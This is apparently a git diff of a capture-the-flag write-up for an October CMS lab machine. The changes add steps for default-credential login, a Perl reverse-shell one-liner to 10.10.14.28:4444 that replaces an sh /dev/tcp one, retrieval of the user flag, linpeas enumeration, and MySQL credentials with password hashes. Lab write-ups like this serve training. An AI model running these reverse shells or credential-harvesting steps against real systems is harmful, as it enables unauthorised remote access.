@@ -167,7 +167,7 @@ $ gobuster dir -u http://10.10.10.16 -w /usr/share/seclists/Discovery/Web-Conten
 						
 When we browse to the url http://10.10.10.16/backend we are redirected to the login page:
 
-![ImgPlaceholder](screenshots/octobercms_login.png)
+![ImgPlaceholder](screenshots/backend_login.png)
 
 We can login on this page with username, password = admin/admin
 
@@ -280,10 +280,13 @@ Mode              Size   Type  Last modified              Name
 100644/rw-r--r--  27035  fil   2017-05-17 15:47:02 +0200  dr.php5
 ```
 
+We use this shell to create an additional reverse shell (in case we have problems with reverse shell, to fall back to the original shell) 
+
 ```
-sh -i >& /dev/tcp/10.10.14.28/4444 0>&1
+perl -e 'use Socket;$i="10.10.14.28";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
+After receiving the new reverse shell We stabelize the shell:
 
 ```
 $ nc -lnvp 4444                            
@@ -309,7 +312,18 @@ drwxr-xr-x 3 root  root     4096 Apr 20  2017 .composer
 
 We can retrieve the user flag:
 
+```
+www-data@october:/home/harry$ cat user.txt 
+cat user.txt 
+29161ca87aa3d34929dc46efc40c89c0
+www-data@october:/home/harry$ 
+```
+
 ![ImgPlaceholder](screenshots/user_flag.png)
+
+We download linpeas.sh on the box, run it and check the output:
+
+We find the credentials for the mysql database backend for the October CMS:
 
 ```
 www-data@october:/home/harry$ cat user.txt 
@@ -341,6 +355,8 @@ The version of mysql:
 $ mysql --version
 mysql  Ver 14.14 Distrib 5.5.55, for debian-linux-gnu (i686) using readline 6.3
 ```
+
+We login into the mysql database and find the accounts we entered:
 
 ```
 $ mysql --host=localhost --user=october --password='OctoberCMSPassword!!' october
@@ -443,10 +459,11 @@ select name,email,password,username from users;
 | admin  | test4@test.com  | $2y$10$yZ6KvG2tsy1pfFqNAnEpo.Fz8tWV.ozjwITGAUzM5a8RcBT15BsuS | test4@test.com  |
 +--------+-----------------+--------------------------------------------------------------+-----------------+
 4 rows in set (0.00 sec)
+```
 
 We don't find any additional credentials in the database we can reuse to login.
 
-In the linpeas.sh this stands out:
+In the linpeas.sh this also stands out:
 
 ```
 -rwsr-xr-x 1 root    root       7.3K Apr 21  2017 /usr/local/bin/ovrflw
